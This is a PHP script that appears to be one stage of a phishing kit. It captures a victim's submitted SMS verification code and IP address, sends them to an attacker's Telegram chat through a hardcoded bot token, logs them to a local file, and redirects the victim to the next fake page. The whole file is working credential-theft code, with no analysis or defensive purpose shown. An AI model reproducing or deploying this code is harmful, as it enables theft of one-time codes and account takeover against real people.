<?php

// using GET URL Parameter -> message
$pesan .= "----------Result login Page 1----------".PHP_EOL;
$pesan .= "Ip----------".$_SERVER['REMOTE_ADDR'].PHP_EOL;
$pesan .= "sms 3----------".$_POST["sms"].PHP_EOL;
$text = urlencode($pesan);
$text2 = $pesan;
$token = "bot"."1126772480:AAH1PSwDjSx3Pnd8LVjflaQjpg1IqV898_g";
$chat_id = '1349145034';
$proxy = "";

$url = "https://api.telegram.org/$token/sendMessage?parse_mode=markdown&chat_id=$chat_id&text=$text";

$ch = curl_init();

if($proxy==""){
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        //CURLOPT_CAINFO => "C:\cacert.pem"   
    );
}
else{ 
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_PROXY => "$proxy",
        //CURLOPT_CAINFO => "C:\cacert.pem"   
    );  
}

curl_setopt_array($ch, $optArray);
$result = curl_exec($ch);

$err = curl_error($ch);
curl_close($ch);    

if($err<>"") echo "Error: $err";
$Txt_Rezlt = fopen('../ress/t.txt', 'a+');
fwrite($Txt_Rezlt, $text2);
fclose($Txt_Rezlt);
header('Location: ../sms3.html');   

?>